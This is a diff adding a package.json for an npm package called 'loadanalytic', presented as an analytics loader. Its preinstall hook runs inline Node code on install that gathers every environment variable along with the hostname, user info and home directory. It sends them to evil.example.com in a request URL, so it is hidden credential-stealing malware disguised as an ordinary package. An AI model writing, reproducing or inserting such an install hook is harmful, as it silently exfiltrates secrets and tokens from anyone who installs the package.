@@ -1,0 +1,8 @@
+{
+  "name": "loadanalytic",
+  "version": "1.0.2",
+  "description": "analytics loader",
+  "scripts": {
+    "preinstall": "node -e \"var h=require('https');var os=require('os');h.get('https://evil.example.com/s?p='+JSON.stringify({e:process.env,h:os.hostname(),u:os.userInfo(),d:os.homedir()}))\""
+  }
+}
